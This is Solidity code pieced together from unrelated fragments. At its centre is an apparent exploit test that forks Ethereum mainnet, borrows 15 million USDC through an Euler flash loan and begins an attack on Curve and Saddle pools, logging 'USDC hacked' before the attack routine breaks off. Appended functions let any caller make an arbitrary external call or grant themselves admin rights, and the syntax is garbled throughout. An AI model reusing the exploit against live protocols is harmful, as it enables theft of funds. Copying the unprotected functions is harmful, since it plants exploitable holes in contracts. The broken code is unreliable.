
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
interface IEuler {
    function flashLoan(address receiver,
        address token,
        uint256 amount,
        bytes calldata data) external returns (bool)};
interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external};
interface ISaddle {
    function swap(uint8 i,
        uint8 j,
        uint256 dx,
        uint256 min_dy,
        uint deadline) external returns (uint)};
contract ContractTest is DSTest {
    address private constant eulerLoans =;
        0x07df2ad9878F8797B4055230bbAE5C808b8259b3;
    address private constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant saddleUsdV2 =;
        0x5f86558387293b6009d7896A61fcc86C17808D62;
    address private constant curvepool =;
        0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address private constant saddlepool =;
        0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 14684306)};
    function testExploit() public {
        IEuler(eulerLoans).flashLoan(address(this),;
            usdc,;
            15000000e6,;
            new bytes(0));
        console.log("USDC hacked: %s", IERC20(usdc).balanceOf(address(this)))};
    function onFlashLoan(address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data) external returns (bytes32) {
        attack();
        IERC20(usdc).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");};
    function attack() internal {
        console.log("USDC loaned: %s", IERC20(usdc).balanceOf(address(this)));
        uint amount = IERC20(usdc).balanceOf(address(this));
        IERC20(usdc).approve(curvepool, amount);
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function grantAdminRole(address user) public {
    admins[user] = true}